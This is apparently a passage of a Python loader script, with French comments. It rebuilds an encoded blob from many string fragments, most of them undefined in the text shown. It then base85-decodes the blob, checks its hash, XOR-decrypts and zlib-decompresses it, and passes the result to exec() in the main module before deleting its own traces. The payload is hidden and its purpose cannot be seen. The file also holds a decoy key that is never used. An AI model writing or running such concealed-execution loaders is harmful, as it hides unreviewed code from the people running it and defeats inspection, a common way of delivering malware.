_cgkFtL5clfmWqO = 'MD;n5CtrS=iYyf_vgnt7@`;6*vVz*jPiE!;+q7|KOD7CX'
_cvJ2glO9BB6fmw = '*<PsuWD#se>7vk0H<BO!K?5n2f!OSS!hI@9<t3-)Pu#JR'
_cbRaBE2pfBzkxV = 'iq`iwGz^Vvfd`V20R'

_pq5JHYLIwfovct = __import__('base64').b85decode(_ceoAKW7rGJZ8Y3 + _coevyTz3qNP7uw + _cjbk4Tr_fjZkkp + _cx5QOjuy3wcJXz + _cqmK4cWUX6TMcz + _coZ0QEPuhi0Rax + _cqScMpcmNFcjjB + _cuos5pExK0MMCT + _cv_YyyMZzr6Pwk + _caUtgznO2HX1gE + _c_8R7aGjN4Gg1a + _cjC38oYjubwH_t + _cvfunj6ZDVxxTP + _cuT0TRA6RsPV15 + _c_YOEmSeRVUgRD + _cu1DVUTIGZCh1F + _cb5xQrW9XPuyLL + _cypWdbbfeq2O2D + _cdyWjPLrhYCud5 + _cxSyTSiXMiVNCs + _cdGEtpkDMzfSao + _cw56r885g4laje + _cndQ3AVJ5foGoU + _cjWN5F_pEArJyB + _cvEslFCtk9a9Uq + _caIsnuWJlxMCIG + _cvAIgIGEtXya7q + _cu8fsw0u5ufa94 + _ciAwPiaVf1pD3a + _cfM5gcsKdJt0ps + _ciEPj1fRa0W44I + _cqC2DC_lWGeO5H + _coK6heHhzxVWKl + _clhGtd1bVTwKpc + _caF9nAlF9z9yf9 + _ci413O34GkyE5F + _cpyrDSRyEN75VA + _cayrlEajlDVcW2 + _cff2g9poc5Xmvb + _cuvV90vS6Fy52c + _c_HhuVdgFrzPud + _csbWqX8NZXmzcr + _co7H9Gnx7SpPzK + _coyvzTX8al7uKg + _caYXb0JW8yhjns + _cjNRGvOIO421le + _co9g4M9Jyvp3YN + _cyY5aEPDufsU4f + _cvv3Ms_g9De5HJ + _cmJbJYRvrJSLHd + _czMJVLDaGwZyNP + _cnI8iRAfLrNPwz + _cpKzn6S_KwX1kX + _cnecJr3gRF3BeP + _ctbDXCRRaiWq1y + _cp7yZ5MS5ptEoO + _cravqcdYk5rJwv + _c_H02ZhUc8k7YY + _csN1YEXJlc27zY + _ccNzg317tblSsM + _cgUCjRhS_8DPEF + _cbn0h7K1mDbAz6 + _ccVOgnOwcDTPCB + _cf5BZLIxlTUmXq + _cjQElfoYnYqPkT + _cb1lcZjsGiCu0M + _cwEvA_92ctezGJ + _czgk98IidCbgd_ + _cxICjD8jBC9vMw + _czqeEo1QeSAqSE + _czYlJguAJdBCQV + _cgEWItbI8pgP6R + _cjtkTnrekZEAyF + _cyKvhClgGYFOcs + _cjpMyGIHihYn2H + _cpkjDVC24q89wk + _coN8oFzBj9x14R + _chLgJNqOtaFAJI + _cnPvck3tsG9l_n + _cqTyHorKYyoJEQ + _cmXI3F7BuJENGl + _crKYqfzgNC_LZ9 + _cj3wny71oD_a2j + _cvBWCGymFkw2nD + _ccKPvggx3hucqj + _ct_fYt7llWovSY + _cgbLbzdXTuin4P + _cjP229F8_mjeM0 + _cmdrOaC3fl91QS + _cqNOCDR3gcD3Tj + _ckVItRDSuNar1V + _cs1tgnKBI48_VZ + _coXsUG9VbQmAfg + _cba_IEf6_OK9c9 + _crg8TK2_UmktgA + _cvnABKJCb0yyjK + _cgmFLWci5SKXzO + _ctHRCAeBFdreLc + _cn0Lf7LiJBWKvs + _c_NjPVZhvJYak7 + _cw21Hewqo0vU3f + _cbbyspuVwm_iNZ + _ct5i4T3imQSE0Y + _cv5UPWN_uU2Mv4 + _cjJfHFFkIGxzdu + _cwLafPdRrmKvgR + _ckysQc95m2xHBd + _cquIWYtpb3CxMF + _cpf6Tof7ukst85 + _cgQRFYW6N1GnPH + _cuD4JZMJFiRAp_ + _csDJIBmmtseLOg + _cltRNQCTPi4y7x + _cwjKxqdbT7mdS4 + _czeeDd3kTJzIYg + _cdUMOyMGm2F52U + _cyaTH7vXju8x8s + _ciluCANx_4vHep + _cfcTOvbNFYC8Zm + _cbzRy3fR0OxVBi + _canMRcwkevjTlG + _cjkcMlaRNCLknK + _clJkJoTIwec_zy + _cqnH8i0mo9qJwz + _caWeWZeioNjdhL + _cm3XySclSSswxh + _crAYgUrm2J7gCO + _cqidDqPdLYvVeW + _coA8rvtLpfE9rP + _cvPDCidMrnPYxV + _c_mnpCjk0q5jfH + _clIC4vVRsuhA0R + _cxyigeWwVfK3vM + _cbuznI0bPobynV + _cwrRjH7p9aPvyh + _caJlLX4XBvnK_y + _cbRobQbKdUZiub + _ci64zVptz3U_nD + _cxu6jTFdxZqZ8Q + _ccmSYh1goM264L + _cfk7Jl9W6N6D9v + _ckuDnB4C2KzlkH + _cw0tg7gAg89vXt + _clbJCFZufLYxLz + _cvtVknzakBKhx_ + _cb_gCnaWp0SFSE + _cdAlzo0VU0LULw + _cqG0VG0AEZkdA1 + _ckPQnufnQ7XP1H + _cl8FcrECCMEC18 + _ccChEoQQXSkLHV + _chGSbzblmrY5j2 + _cdMwFeD3GjFCXZ + _ceUmKhZVQzUWYZ + _ch_mW7JB_FR4ED + _c_zNW6qzoTiRK6 + _cvK4sSrCMAgAzW + _ctU7hDGLuv099i + _ctQx_ueGtzlIV7 + _cjxuQhsXI6Se1B + _cd1CPfkegw9f6w + _cusPjR9PlXQNMn + _crf1wHb0ntjmmg + _ccylZ0Mytsdjof + _cxrEI26oqvBPmx + _c_3hzL_NKa0JBT + _cbfDcotgDHRR75 + _c_lN1SfYKrJOGX + _cy4xkoBmGpiMOG + _cxJhSx8DIFlsQ1 + _cqxvXtYG12fWUF + _cvYwvw6LEecSXt + _cm7gfZEW8nxtYY + _cr82SzRrI8_cdh + _cju9RuUdGH6Now + _cdmJC32D7jkTrG + _cnf1UcyiYNHuem + _cp7LVW7MpKG8dd + _csxBss1JaDk_vb + _cveMH4eQUoBvEU + _ctZM71cR0qSb25 + _cgwaKEckMHZECE + _cjkoR9d7LnvHnv + _cjIhOdsfgKhKlx + _cqiNjorPeIZ2h6 + _c_2iVHo2kBloHn + _ciHC4HLxVpYh7H + _cweWcNqXY8mIQt + _caqxqV2YhpiRnT + _czzd1MxUQ8GJPI + _cnP3sZ2dB0qmHZ + _co8fgs0Na5PQbC + _cuV8AmpH8yz0z9 + _cbPCjAwuEzS1J6 + _cmE4Usz0vTcVLD + _cuPIo90BLZvNvh + _cmBb7KdueuD3pL + _ccjlRDpl3x6K8M + _czZNnD8IQ1Y1aS + _ckjjv5eDopnM41 + _cvJtFJz0Rll4EK + _ci34GAz3nQF3BE + _cwR3dOgm1QnUHC + _cwkTglB03O5RbY + _czUTHaEn_2zl_4 + _ci1wgfaAdI5kzj + _cyGfgxjSnhqTEC + _csSBgiYSCdena3 + _cbci7KRac4_b3M + _ceLLhTKwPiBrSe + _cbHwj5e9Bqy5Oc + _cehVZWUvVa2Ad3 + _ciVgevJqDf_Cn1 + _cbWbSdGB7d36kZ + _ch3kRr7C4FckPk + _ciRS_e71L93xqT + _ceQHO1Xz5xBAvn + _ct9Qeqogb1Sw34 + _cn8fFXJHylfqv9 + _cbfpEjEIEalhJt + _ceCtdFnFbxMtlS + _co84FDbO9qAmD2 + _cyPgEQcj5OMiwX + _cgSiEcpv97_t0N + _ctUzylFE79yiu1 + _cmwpglvmfYAiID + _cgkFtL5clfmWqO + _cvJ2glO9BB6fmw + _cbRaBE2pfBzkxV)
if __import__('hashlib').sha256(_pq5JHYLIwfovct).hexdigest() != 'a00136d263f41d6347720a0cb8fa16dce88adfe8ab15dffcbfb652f7d61a9518':
    __import__('sys').exit(1)
_xhBO4lK27VejGM = bytes([119, 25, 23, 56, 199, 245, 201, 105, 148, 142, 62, 248, 174, 181, 255, 35, 43, 133, 56, 198, 217, 182, 84, 53, 37, 72, 46, 155, 77])
_fki3ZRfhLKo403W = bytes([148, 99, 124, 215, 240, 208, 239, 185, 175, 73, 95, 117, 211, 38, 17, 209, 16, 107, 197, 134, 31, 73, 16, 33, 179, 165, 238, 105, 148])

def _fxuQ7jstwx1rkuS(_bkYp2oHukfmP5Z, _kyVvhRIIXOIc_Y):
    return bytes(_bkYp2oHukfmP5Z[_iqm24qJzYwlcKk] ^ _kyVvhRIIXOIc_Y[_iqm24qJzYwlcKk % len(_kyVvhRIIXOIc_Y)] for _iqm24qJzYwlcKk in range(len(_bkYp2oHukfmP5Z)))

def _fdmQvrXwhColDHB(_txGbiTy9Gn_2lQ):
    import zlib
    return zlib.decompress(_txGbiTy9Gn_2lQ) # Un seul niveau de zlib ici pour simplifier

def _fexG43OgxFgxSjd():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xwLjc7JhBTCdlf = _fxuQ7jstwx1rkuS(_pq5JHYLIwfovct, _xhBO4lK27VejGM)
    # 2. Décompression Zlib
    _dvW56kezPLcSfw = _fdmQvrXwhColDHB(_xwLjc7JhBTCdlf)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dvW56kezPLcSfw.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nvn8OPB5a1EOOZ = _main.__dict__
    _nvn8OPB5a1EOOZ.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nvn8OPB5a1EOOZ)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fexG43OgxFgxSjd()
try:
    del _fxuQ7jstwx1rkuS, _fdmQvrXwhColDHB, _fexG43OgxFgxSjd
    del _pq5JHYLIwfovct, _xhBO4lK27VejGM, _fki3ZRfhLKo403W
except:
    pass
